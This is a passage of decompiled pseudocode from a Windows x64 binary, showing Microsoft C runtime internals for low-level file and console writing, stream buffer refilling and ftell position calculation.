    *(_DWORD *)sub_140018888() = 9;
    invalid_parameter_noinfo();
  }
  return -1;
}


// ----- ?write_double_translated_ansi_nolock@@YA?AUwrite_result@?A0x17268360@@HQEBDIAEAV__crt_cached_ptd_host@@@Z @ 0x14001e260 -----
__int64 __fastcall write_double_translated_ansi_nolock(
        __int64 a1,
        int a2,
        _BYTE *a3,
        int a4,
        __crt_cached_ptd_host *a5)
{
  _BYTE *v5; // rsi
  __int64 v6; // r14
  __int64 v8; // r13
  __int64 v9; // r15
  unsigned __int64 v10; // r12
  int v11; // edi
  __crt_cached_ptd_host *v12; // r10
  int v13; // ecx
  __int64 v14; // r11
  int v15; // edx
  int v16; // r12d
  int v17; // edx
  __int64 v18; // r14
  _BYTE *v19; // rcx
  int v20; // r12d
  __int64 v21; // r8
  signed __int64 v22; // r9
  __int64 v23; // rcx
  _BYTE *v24; // rdx
  __int64 i; // rdx
  __int64 v26; // r13
  __int64 v27; // r9
  int v28; // r14d
  __int64 v29; // r8
  char v30; // cl
  __int64 v31; // r8
  _BYTE *v32; // rdx
  __int64 v33; // r9
  DWORD v34; // eax
  DWORD v35; // r14d
  HANDLE v36; // r12
  _BYTE *v37; // rsi
  __int64 v38; // r8
  __int64 v39; // r10
  __int16 v41[2]; // [rsp+48h] [rbp-71h] BYREF
  int v42; // [rsp+4Ch] [rbp-6Dh] BYREF
  DWORD NumberOfBytesWritten; // [rsp+50h] [rbp-69h] BYREF
  unsigned __int64 v44; // [rsp+58h] [rbp-61h]
  __crt_cached_ptd_host *v45; // [rsp+60h] [rbp-59h]
  __int64 v46; // [rsp+68h] [rbp-51h] BYREF
  UINT ConsoleOutputCP; // [rsp+70h] [rbp-49h]
  int v48; // [rsp+74h] [rbp-45h]
  _BYTE *v49; // [rsp+78h] [rbp-41h]
  __int64 v50; // [rsp+80h] [rbp-39h]
  __int64 v51; // [rsp+88h] [rbp-31h] BYREF
  _BYTE *v52; // [rsp+90h] [rbp-29h] BYREF
  _BYTE *v53; // [rsp+98h] [rbp-21h] BYREF
  HANDLE hFile; // [rsp+A0h] [rbp-19h]
  __int64 v55; // [rsp+A8h] [rbp-11h]
  __int64 v56; // [rsp+B0h] [rbp-9h]
  _BYTE v57[8]; // [rsp+B8h] [rbp-1h] BYREF
  _BYTE v58[8]; // [rsp+C0h] [rbp+7h] BYREF
  char Buffer[8]; // [rsp+C8h] [rbp+Fh] BYREF

  v56 = -2;
  v5 = a3;
  v49 = a3;
  v6 = a2;
  v45 = a5;
  v8 = (__int64)a2 >> 6;
  v50 = v8;
  v9 = 9LL * (a2 & 0x3F);
  hFile = *(HANDLE *)(qword_1400A0680[v8] + 72LL * (a2 & 0x3F) + 40);
  v10 = (unsigned __int64)&a3[a4];
  v44 = v10;
  ConsoleOutputCP = GetConsoleOutputCP();
  v11 = 0;
  v12 = a5;
  if ( *((_BYTE *)a5 + 40) == 0 )
  {
    __crt_cached_ptd_host::update_locale_slow(v45);
    v12 = v45;
  }
  v13 = *(_DWORD *)(*((_QWORD *)v12 + 3) + 12LL);
  v48 = v13;
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)v49 < v10 )
  {
    v14 = v6 >> 6;
    v55 = v6 >> 6;
    v15 = 0;
    while ( 1 )
    {
      LOBYTE(v41[0]) = *v5;
      v42 = 0;
      v16 = 1;
      if ( v13 == 65001 )
      {
        v17 = 0;
        v18 = 0;
        v19 = (_BYTE *)(qword_1400A0680[v14] + 8 * v9 + 62);
        do
        {
          if ( *v19 == 0 )
            break;
          ++v17;
          ++v18;
          ++v19;
        }
        while ( v18 < 5 );
        if ( v18 <= 0 )
        {
          v26 = byte_14009ED10[(unsigned __int8)*v5];
          v27 = v44 - (_QWORD)v5;
          if ( (int)v26 + 1 > (__int64)(v44 - (_QWORD)v5) )
          {
            if ( v27 > 0 )
            {
              v38 = 0;
              v39 = v50;
              do
              {
                *(_BYTE *)(v38 + 8 * v9 + qword_1400A0680[v39] + 62) = v5[v38];
                ++v11;
                ++v38;
              }
              while ( v11 < v27 );
            }
            *(_DWORD *)(a1 + 4) += v27;
            return a1;
          }
          v46 = 0;
          v53 = v5;
          v28 = ((_DWORD)v26 == 3) + 1;
          if ( sub_1400224A4((unsigned int)&v42, (unsigned int)&v53, v28, (unsigned int)&v46, (__int64)v12) == -1 )
            return a1;
          v5 += v26;
          v16 = v28;
          v8 = v50;
        }
        else
        {
          v20 = byte_14009ED10[*(unsigned __int8 *)(qword_1400A0680[v8] + 8 * v9 + 62)] + 1;
          LODWORD(v46) = v20 - v17;
          v21 = v44 - (_QWORD)v5;
          v22 = v20 - v17;
          if ( v22 > (__int64)(v44 - (_QWORD)v5) )
          {
            if ( v21 > 0 )
            {
              v37 = &v5[-v18];
              do
              {
                *(_BYTE *)(v18 + 8 * v9 + qword_1400A0680[v8] + 62) = v37[v18];
                ++v11;
                ++v18;
              }
              while ( v11 < v21 );
            }
            *(_DWORD *)(a1 + 4) += v21;
            return a1;
          }
          v23 = 0;
          v24 = (_BYTE *)(qword_1400A0680[v14] + 8 * v9 + 62);
          do
            v57[v23++] = *v24++;
          while ( v23 < v18 );
          if ( v22 > 0 )
          {
            memcpy(&v57[v18], v5, v22);
            v12 = v45;
          }
          for ( i = 0; i < v18; ++i )
            *(_BYTE *)(i + 8 * v9 + qword_1400A0680[v8] + 62) = 0;
          v51 = 0;
          v52 = v57;
          v16 = (v20 == 4) + 1;
          if ( sub_1400224A4((unsigned int)&v42, (unsigned int)&v52, v16, (unsigned int)&v51, (__int64)v12) == -1 )
            return a1;
          v5 += (int)v46 - 1;
        }
      }
      else
      {
        v29 = qword_1400A0680[v8];
        v30 = *(_BYTE *)(v29 + 8 * v9 + 61);
        if ( (v30 & 4) != 0 )
        {
          v58[0] = *(_BYTE *)(v29 + 8 * v9 + 62);
          v58[1] = *v5;
          *(_BYTE *)(v29 + 8 * v9 + 61) = v30 & 0xFB;
          v31 = 2;
          v32 = v58;
          goto LABEL_29;
        }
        v33 = (unsigned __int8)*v5;
        if ( *(__int16 *)(**((_QWORD **)v12 + 3) + 2 * v33) >= 0 )
        {
          v31 = 1;
          v32 = v5;
LABEL_29:
          if ( (unsigned int)mbtowc_internal(&v42, v32, v31, v12) == -1 )
            return a1;
          goto LABEL_30;
        }
        if ( (unsigned __int64)(v5 + 1) >= v44 )
        {
          *(_BYTE *)(v29 + 8 * v9 + 62) = v33;
          *(_BYTE *)(qword_1400A0680[v8] + 8 * v9 + 61) |= 4u;
          *(_DWORD *)(a1 + 4) = v15 + 1;
          return a1;
        }
        if ( (unsigned int)mbtowc_internal(&v42, v5, 2, v12) == -1 )
          return a1;
        ++v5;
      }
LABEL_30:
      ++v5;
      v34 = _acrt_WideCharToMultiByte(ConsoleOutputCP, 0, (unsigned int)&v42, v16, (unsigned int)Buffer, 5, 0, 0);
      v35 = v34;
      if ( v34 == 0 )
        return a1;
      NumberOfBytesWritten = 0;
      v36 = hFile;
      if ( !WriteFile(hFile, Buffer, v34, &NumberOfBytesWritten, nullptr) )
      {
LABEL_48:
        *(_DWORD *)a1 = GetLastError();
        return a1;
      }
      v15 = (_DWORD)v5 + *(_DWORD *)(a1 + 8) - (_DWORD)v49;
      *(_DWORD *)(a1 + 4) = v15;
      if ( NumberOfBytesWritten < v35 )
        return a1;
      if ( LOBYTE(v41[0]) == 10 )
      {
        v41[0] = 13;
        if ( !WriteFile(v36, v41, 1u, &NumberOfBytesWritten, nullptr) )
          goto LABEL_48;
        if ( NumberOfBytesWritten == 0 )
          return a1;
        ++*(_DWORD *)(a1 + 8);
        v15 = ++*(_DWORD *)(a1 + 4);
      }
      if ( (unsigned __int64)v5 >= v44 )
        return a1;
      v12 = v45;
      v14 = v55;
      v13 = v48;
    }
  }
  return a1;
}


// ----- ?write_text_ansi_nolock@@YA?AUwrite_result@?A0x17268360@@HQEBDI@Z @ 0x14001e6f4 -----
__int64 __fastcall write_text_ansi_nolock(__int64 a1, int a2, char *a3, int a4)
{
  unsigned __int64 v5; // rbp
  char *v6; // rsi
  void *v7; // r14
  char *v8; // rbx
  char v9; // al
  DWORD v10; // ebx
  DWORD v11; // eax
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-1438h] BYREF
  _BYTE Buffer[5119]; // [rsp+40h] [rbp-1428h] BYREF
  char v15; // [rsp+143Fh] [rbp-29h] BYREF

  v5 = (unsigned __int64)&a3[a4];
  v6 = a3;
  v7 = *(void **)(qword_1400A0680[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)a3 < v5 )
  {
    while ( 1 )
    {
      v8 = Buffer;
      do
      {
        if ( (unsigned __int64)v6 >= v5 )
          break;
        v9 = *v6++;
        if ( v9 == 10 )
        {
          ++*(_DWORD *)(a1 + 8);
          *v8++ = 13;
        }
        *v8++ = v9;
      }
      while ( v8 < &v15 );
      NumberOfBytesWritten = 0;
      v10 = (_DWORD)v8 - (unsigned int)Buffer;
      if ( !WriteFile(v7, Buffer, v10, &NumberOfBytesWritten, nullptr) )
        break;
      v11 = NumberOfBytesWritten;
      *(_DWORD *)(a1 + 4) += NumberOfBytesWritten;
      if ( v11 < v10 || (unsigned __int64)v6 >= v5 )
        return a1;
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ----- ?write_text_utf16le_nolock@@YA?AUwrite_result@?A0x17268360@@HQEBDI@Z @ 0x14001e7fc -----
__int64 __fastcall write_text_utf16le_nolock(__int64 a1, int a2, __int16 *a3, unsigned int a4)
{
  unsigned __int64 v5; // rbp
  __int16 *v6; // rsi
  void *v7; // r14
  char *v8; // rbx
  __int16 v9; // ax
  DWORD v10; // ebx
  DWORD v11; // eax
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-1438h] BYREF
  _BYTE Buffer[5118]; // [rsp+40h] [rbp-1428h] BYREF
  __int16 v15; // [rsp+143Eh] [rbp-2Ah] BYREF

  v5 = (unsigned __int64)a3 + a4;
  v6 = a3;
  v7 = *(void **)(qword_1400A0680[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)a3 < v5 )
  {
    while ( 1 )
    {
      v8 = Buffer;
      do
      {
        if ( (unsigned __int64)v6 >= v5 )
          break;
        v9 = *v6++;
        if ( v9 == 10 )
        {
          *(_DWORD *)(a1 + 8) += 2;
          *(_WORD *)v8 = 13;
          v8 += 2;
        }
        *(_WORD *)v8 = v9;
        v8 += 2;
      }
      while ( v8 < (char *)&v15 );
      NumberOfBytesWritten = 0;
      v10 = 2 * ((v8 - Buffer) >> 1);
      if ( !WriteFile(v7, Buffer, v10, &NumberOfBytesWritten, nullptr) )
        break;
      v11 = NumberOfBytesWritten;
      *(_DWORD *)(a1 + 4) += NumberOfBytesWritten;
      if ( v11 < v10 || (unsigned __int64)v6 >= v5 )
        return a1;
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ----- ?write_text_utf8_nolock@@YA?AUwrite_result@?A0x17268360@@HQEBDI@Z @ 0x14001e918 -----
__int64 __fastcall write_text_utf8_nolock(__int64 a1, int a2, __int16 *a3, unsigned int a4)
{
  unsigned __int64 v5; // r14
  int v6; // r15d
  __int16 *v7; // rdi
  void *v8; // r12
  char *v9; // r9
  __int16 v10; // ax
  unsigned int v11; // ebp
  unsigned int v12; // esi
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-1458h] BYREF
  _BYTE v15[1704]; // [rsp+50h] [rbp-1448h] BYREF
  char v16; // [rsp+6F8h] [rbp-DA0h] BYREF
  struct _OVERLAPPED Overlapped; // [rsp+700h] [rbp-D98h] BYREF

  v5 = (unsigned __int64)a3 + a4;
  v6 = (int)a3;
  v7 = a3;
  v8 = *(void **)(qword_1400A0680[(__int64)a2 >> 6] + 72LL * (a2 & 0x3F) + 40);
  *(_QWORD *)a1 = 0;
  *(_DWORD *)(a1 + 8) = 0;
  if ( (unsigned __int64)a3 < v5 )
  {
LABEL_2:
    v9 = v15;
    do
    {
      if ( (unsigned __int64)v7 >= v5 )
        break;
      v10 = *v7++;
      if ( v10 == 10 )
      {
        *(_WORD *)v9 = 13;
        v9 += 2;
      }
      *(_WORD *)v9 = v10;
      v9 += 2;
    }
    while ( v9 < &v16 );
    v11 = _acrt_WideCharToMultiByte(65001, 0, (unsigned int)v15, (v9 - v15) >> 1, (unsigned int)&Overlapped, 3413, 0, 0);
    if ( v11 != 0 )
    {
      v12 = 0;
      while ( 1 )
      {
        NumberOfBytesWritten = 0;
        if ( !WriteFile(v8, (char *)&Overlapped + v12, v11 - v12, &NumberOfBytesWritten, nullptr) )
          break;
        v12 += NumberOfBytesWritten;
        if ( v12 >= v11 )
        {
          *(_DWORD *)(a1 + 4) = (_DWORD)v7 - v6;
          if ( (unsigned __int64)v7 < v5 )
            goto LABEL_2;
          return a1;
        }
      }
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ----- _write @ 0x14001ea8c -----
int __cdecl write(int FileHandle, const void *Buf, unsigned int MaxCharCount)
{
  int v3; // edi
  int v4; // ebx
  int v5; // ebx
  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_14009ECA8;
  }
  v3 = write_internal(FileHandle, Buf, MaxCharCount, v7);
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 36) = v5;
  }
  return v3;
}


// ----- _write_internal @ 0x14001eb24 -----
__int64 __fastcall write_internal(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4)
{
  BOOL v8; // eax
  __int64 v9; // r15
  unsigned int v10; // r14d

  if ( a1 == -2 )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    return 0xFFFFFFFFLL;
  }
  v8 = (a1 & 0x80000000) == 0 && a1 < dword_1400A0A80;
  if ( !v8 || (v9 = (__int64)(int)a1 >> 6, (*(_BYTE *)(qword_1400A0680[v9] + 72LL * (a1 & 0x3F) + 56) & 1) == 0) )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a4);
    return 0xFFFFFFFFLL;
  }
  _acrt_lowio_lock_fh(a1);
  v10 = -1;
  if ( (*(_BYTE *)(qword_1400A0680[v9] + 72LL * (a1 & 0x3F) + 56) & 1) != 0 )
  {
    v10 = sub_14001EC44(a1, a2, a3, a4);
  }
  else
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 9;
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
  }
  _acrt_lowio_unlock_fh(a1);
  return v10;
}


// ----- sub_14001EC44 @ 0x14001ec44 -----
__int64 __fastcall sub_14001EC44(int a1, unsigned __int16 *a2, unsigned int a3, __int64 a4)
{
  int v4; // edi
  __int64 v5; // r14
  __int64 v6; // r13
  __int64 v10; // rax
  __int64 v11; // r12
  __int64 v12; // r15
  __int64 v13; // rcx
  unsigned __int16 *v14; // r12
  unsigned __int16 *v15; // r15
  DWORD v16; // r14d
  __int64 v17; // rax
  __int64 v18; // xmm0_8
  __int64 v19; // rdx
  void *v20; // rcx
  char v21; // [rsp+30h] [rbp-38h]
  __int16 v22; // [rsp+30h] [rbp-38h]
  DWORD NumberOfBytesWritten[2]; // [rsp+38h] [rbp-30h] BYREF
  int v24; // [rsp+40h] [rbp-28h]
  __int64 v25; // [rsp+48h] [rbp-20h]
  DWORD Mode[4]; // [rsp+58h] [rbp-10h] BYREF

  v4 = 0;
  v5 = a3;
  v6 = a1;
  if ( a3 == 0 )
    return 0;
  if ( a2 == nullptr
    || (v10 = a1 & 0x3F,
        v11 = (__int64)a1 >> 6,
        v12 = 9 * v10,
        v13 = qword_1400A0680[v11],
        (unsigned __int8)((v21 = *(_BYTE *)(v13 + 72 * v10 + 57)) - 1) <= 1u)
    && (a3 & 1) != 0 )
  {
    *(_BYTE *)(a4 + 56) = 1;
    *(_DWORD *)(a4 + 52) = 0;
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a4);
    return 0xFFFFFFFFLL;
  }
  if ( (*(_BYTE *)(v13 + 72 * v10 + 56) & 0x20) != 0 )
    common_lseek_nolock<__int64>((unsigned int)v6, 0, 2, a4);
  v25 = 0;
  if ( isatty(v6) != 0 && *(char *)(qword_1400A0680[v11] + 8 * v12 + 56) < 0 )
  {
    if ( *(_BYTE *)(a4 + 40) == 0 )
      __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)a4);
    if ( *(_QWORD *)(*(_QWORD *)(a4 + 24) + 312LL) != 0 || *(_BYTE *)(qword_1400A0680[v11] + 8 * v12 + 57) != 0 )
    {
      Mode[0] = 0;
      if ( GetConsoleMode(*(HANDLE *)(qword_1400A0680[v11] + 8 * v12 + 40), Mode) )
      {
        if ( v21 == 0 )
        {
          v17 = write_double_translated_ansi_nolock(
                  (__int64)NumberOfBytesWritten,
                  v6,
                  a2,
                  v5,
                  (__crt_cached_ptd_host *)a4);
          goto LABEL_28;
        }
        if ( (unsigned int)(v21 - 1) <= 1 )
        {
          v14 = (unsigned __int16 *)((char *)a2 + v5);
          *(_QWORD *)NumberOfBytesWritten = 0;
          v15 = a2;
          if ( a2 < (unsigned __int16 *)((char *)a2 + v5) )
          {
            v16 = NumberOfBytesWritten[1];
            while ( 1 )
            {
              v22 = *v15;
              if ( (unsigned __int16)sub_140027D84(*v15) != v22 )
                break;
              v16 += 2;
              NumberOfBytesWritten[1] = v16;
              if ( v22 == 10 )
              {
                if ( (unsigned __int16)sub_140027D84(13) != 13 )
                  break;
                NumberOfBytesWritten[1] = ++v16;
                ++v4;
              }
              if ( ++v15 >= v14 )
                goto LABEL_39;
            }
            NumberOfBytesWritten[0] = GetLastError();
          }
          goto LABEL_39;
        }
LABEL_41:
        if ( HIDWORD(v25) != 0 )
          return (unsigned int)(HIDWORD(v25) - v4);
        if ( (_DWORD)v25 != 0 )
        {
          if ( (_DWORD)v25 == 5 )
          {
            *(_BYTE *)(a4 + 48) = 1;
            *(_DWORD *)(a4 + 44) = 9;
            *(_BYTE *)(a4 + 56) = 1;
            *(_DWORD *)(a4 + 52) = 5;
          }
          else
          {
            _acrt_errno_map_os_error_ptd(v25, a4);
          }
          return 0xFFFFFFFFLL;
        }
        if ( (*(_BYTE *)(qword_1400A0680[v6 >> 6] + 72 * (v6 & 0x3F) + 56) & 0x40) == 0 || *(_BYTE *)a2 != 26 )
        {
          *(_DWORD *)(a4 + 52) = 0;
          *(_BYTE *)(a4 + 48) = 1;
          *(_DWORD *)(a4 + 44) = 28;
          *(_BYTE *)(a4 + 56) = 1;
          return 0xFFFFFFFFLL;
        }
        return 0;
      }
    }
  }
  v19 = qword_1400A0680[v6 >> 6];
  if ( *(char *)(v19 + 72 * (v6 & 0x3F) + 56) >= 0 )
  {
    v20 = *(void **)(v19 + 72 * (v6 & 0x3F) + 40);
    *(_QWORD *)NumberOfBytesWritten = 0;
    v24 = 0;
    if ( !WriteFile(v20, a2, v5, &NumberOfBytesWritten[1], nullptr) )
      NumberOfBytesWritten[0] = GetLastError();
    v4 = v24;
LABEL_39:
    v18 = *(_QWORD *)NumberOfBytesWritten;
    goto LABEL_40;
  }
  if ( v21 != 0 )
  {
    if ( v21 == 1 )
    {
      v17 = write_text_utf8_nolock((__int64)NumberOfBytesWritten, v6, (__int16 *)a2, v5);
    }
    else
    {
      if ( v21 != 2 )
        goto LABEL_41;
      v17 = write_text_utf16le_nolock((__int64)NumberOfBytesWritten, v6, (__int16 *)a2, v5);
    }
  }
  else
  {
    v17 = write_text_ansi_nolock((__int64)NumberOfBytesWritten, v6, (char *)a2, v5);
  }
LABEL_28:
  v18 = *(_QWORD *)v17;
  v4 = *(_DWORD *)(v17 + 8);
LABEL_40:
  v25 = v18;
  goto LABEL_41;
}


// ----- __acrt_stdio_refill_and_read_narrow_nolock @ 0x14001ef74 -----
__int64 __fastcall _acrt_stdio_refill_and_read_narrow_nolock(FILE *Stream)
{
  unsigned int v2; // edi
  char *v4; // rdi
  unsigned int charbuf; // ebx
  int v6; // eax
  int v7; // eax
  __int64 v8; // rbx
  _BYTE *v9; // rax
  char *ptr; // rax

  if ( Stream == nullptr )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return (unsigned int)-1;
  }
  if ( (HIDWORD(Stream->_base) & 0x2000) == 0 || (HIDWORD(Stream->_base) & 0x1000) != 0 )
    return (unsigned int)-1;
  if ( (HIDWORD(Stream->_base) & 2) != 0 )
  {
    _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 0x10u);
    return (unsigned int)-1;
  }
  _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 1u);
  if ( (HIDWORD(Stream->_base) & 0x4C0) == 0 )
    _acrt_stdio_allocate_buffer_nolock(Stream);
  v4 = *(char **)&Stream->_cnt;
  charbuf = Stream->_charbuf;
  Stream->_ptr = v4;
  v6 = fileno(Stream);
  v7 = read(v6, v4, charbuf);
  LODWORD(Stream->_base) = v7;
  if ( (unsigned int)(v7 + 1) <= 1 )
  {
    _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, v7 != 0 ? 16 : 8);
    LODWORD(Stream->_base) = 0;
    return (unsigned int)-1;
  }
  if ( (HIDWORD(Stream->_base) & 6) == 0 )
  {
    if ( fileno(Stream) == -1 || fileno(Stream) == -2 )
    {
      v9 = &unk_14009ECC0;
    }
    else
    {
      v8 = (__int64)fileno(Stream) >> 6;
      v9 = (_BYTE *)(72LL * (fileno(Stream) & 0x3F) + qword_1400A0680[v8]);
    }
    if ( (v9[56] & 0x82) == 0x82 )
      _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 0x20u);
  }
  if ( Stream->_charbuf == 512 && (HIDWORD(Stream->_base) & 0x40) != 0 && (HIDWORD(Stream->_base) & 0x100) == 0 )
    Stream->_charbuf = 4096;
  ptr = Stream->_ptr;
  --LODWORD(Stream->_base);
  v2 = (unsigned __int8)*ptr;
  Stream->_ptr = ptr + 1;
  return v2;
}


// ----- ??$common_ftell@_J@@YA_JV__crt_stdio_stream@@AEAV__crt_cached_ptd_host@@@Z @ 0x14001f0e0 -----
__int64 __fastcall common_ftell<__int64>(FILE *Stream, __int64 a2)
{
  __int64 v5; // rdi

  if ( Stream != nullptr )
  {
    lock_file(Stream);
    v5 = common_ftell_nolock<__int64>(Stream, a2);
    unlock_file(Stream);
    return v5;
  }
  else
  {
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a2);
    return -1;
  }
}


// ----- ??$common_ftell_nolock@_J@@YA_JV__crt_stdio_stream@@AEAV__crt_cached_ptd_host@@@Z @ 0x14001f14c -----
__int64 __fastcall common_ftell_nolock<__int64>(FILE *a1, __int64 a2)
{
  int v5; // eax
  __int64 v6; // rsi
  __int64 v7; // r11
  __int64 *v8; // r8
  char *v9; // r10
  __int64 v10; // rcx
  __int64 v11; // rdx
  char v12; // si
  __int64 v13; // rax
  __int64 v14; // r10

  if ( a1 == nullptr )
  {
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a2);
    return -1;
  }
  v5 = fileno(a1);
  v6 = v5;
  if ( SLODWORD(a1->_base) < 0 )
    LODWORD(a1->_base) = 0;
  v7 = common_lseek<__int64>((unsigned int)v5, 0, 1, a2);
  if ( v7 < 0 )
    return -1;
  if ( (HIDWORD(a1->_base) & 0xC0) == 0 )
    return v7 - SLODWORD(a1->_base);
  v8 = qword_1400A0680;
  v9 = &a1->_ptr[-*(_QWORD *)&a1->_cnt];
  v10 = v6 >> 6;
  v11 = 9 * (v6 & 0x3F);
  v12 = *(_BYTE *)(qword_1400A0680[v6 >> 6] + 72 * (v6 & 0x3F) + 57);
  if ( (HIDWORD(a1->_base) & 3) != 0 )
  {
    if ( v12 == 1 && (*(_BYTE *)(qword_1400A0680[v10] + 8 * v11 + 61) & 2) != 0 )
      return common_ftell_translated_utf8_nolock(a1, v7, a2);
    if ( *(char *)(qword_1400A0680[v10] + 8 * v11 + 56) < 0 )
    {
      LOBYTE(v8) = v12;
      v13 = count_newline_bytes(*(_QWORD *)&a1->_cnt, a1->_ptr, v8);
      v9 = (char *)(v13 + v14);
    }
  }
  else if ( (HIDWORD(a1->_base) & 4) == 0 )
  {
    *(_BYTE *)(a2 + 48) = 1;
    *(_DWORD *)(a2 + 44) = 22;
    return -1;
  }
  if ( v7 == 0 )
    return (__int64)v9;
  if ( (HIDWORD(a1->_base) & 1) != 0 )
    return common_ftell_read_mode_nolock(a1, v7, v9, a2);
  if ( v12 == 1 )
    v9 = (char *)((unsigned __int64)v9 >> 1);
  return (__int64)&v9[v7];
}


// ----- ?common_ftell_read_mode_nolock@@YA_JV__crt_stdio_stream@@_J1AEAV__crt_cached_ptd_host@@@Z @ 0x14001f29c -----
__int64 __fastcall common_ftell_read_mode_nolock(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v6; // r12d
  __int64 v7; // rdi
  __int64 v8; // rcx
  __int64 v9; // r13
  __int64 v10; // rax
  char v11; // si
  __int64 result; // rax
  __int64 v13; // rbp
  __int64 v14; // rax
  __int64 v15; // r8
  __int64 v16; // rdx
  bool v17; // zf
  __int64 v18; // [rsp+60h] [rbp+8h]

  v6 = fileno((FILE *)a1);
  v7 = 0;
  v8 = v6 & 0x3F;
  v18 = (__int64)(int)v6 >> 6;
  v9 = 9 * v8;
  v10 = qword_1400A0680[v18];
  v11 = *(_BYTE *)(v10 + 72 * v8 + 57);
  if ( *(_DWORD *)(a1 + 16) == 0 )
    return a2;
  v13 = *(_QWORD *)a1 + *(int *)(a1 + 16) - *(_QWORD *)(a1 + 8);
  if ( *(char *)(v10 + 72 * v8 + 56) < 0 )
  {
    if ( common_lseek<__int64>(v6, 0, 2, a4) == a2 )
    {
      LOBYTE(v15) = v11;
      v16 = count_newline_bytes(*(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 8) + v13, v15) + v13;
      v17 = (*(_DWORD *)(a1 + 20) & 0x20) == 0;
    }
    else
    {
      result = common_lseek<__int64>(v6, a2, 0, a4);
      if ( result == -1 )
        return result;
      v16 = 512;
      if ( v13 > 512 || (*(_DWORD *)(a1 + 20) & 0x40) == 0 || (*(_DWORD *)(a1 + 20) & 0x100) != 0 )
        v16 = *(int *)(a1 + 32);
      v17 = (*(_BYTE *)(qword_1400A0680[v18] + 8 * v9 + 56) & 4) == 0;
    }
    if ( !v17 )
    {
      LOBYTE(v7) = (unsigned __int8)(v11 - 1) <= 1u;
      v16 += v7 + 1;
    }
    v14 = v16;
  }
  else
  {
    v14 = *(_QWORD *)a1 + *(int *)(a1 + 16) - *(_QWORD *)(a1 + 8);
  }
  return a2 + a3 / ((v11 == 1) + 1LL) - v14 / ((v11 == 1) + 1LL);
}


// ----- ?common_ftell_translated_utf8_nolock@@YA_JV__crt_stdio_stream@@_JAEAV__crt_cached_ptd_host@@@Z @ 0x14001f3f8 -----
__int64 __fastcall common_ftell_translated_utf8_nolock(__int64 a1, __int64 a2, __int64 a3)
{
  int v6; // eax
  __int64 v7; // rdi
  unsigned int v8; // r14d
  __int64 v10; // kr00_8
  __int64 v11; // rbx
  __int64 v12; // rsi
  __int64 v13; // r13
  __int64 v14; // rcx
  unsigned __int8 *v15; // rdx
  unsigned __int8 *v16; // rcx
  DWORD NumberOfBytesRead; // [rsp+30h] [rbp-1058h] BYREF
  _BYTE Buffer[4096]; // [rsp+40h] [rbp-1048h] BYREF

  v6 = fileno((FILE *)a1);
  v7 = 0;
  v8 = v6;
  if ( *(_DWORD *)(a1 + 16) == 0 )
    return a2;
  v10 = *(_QWORD *)a1 - *(_QWORD *)(a1 + 8);
  v11 = (__int64)v6 >> 6;
  v12 = v10 / 2;
  v13 = common_lseek<__int64>((unsigned int)v6, *(_QWORD *)(qword_1400A0680[v11] + 72LL * (v6 & 0x3F) + 48), 0, a3);
  v14 = qword_1400A0680[v11];
  if ( v13 != *(_QWORD *)(v14 + 72LL * (v8 & 0x3F) + 48) )
    return -1;
  NumberOfBytesRead = 0;
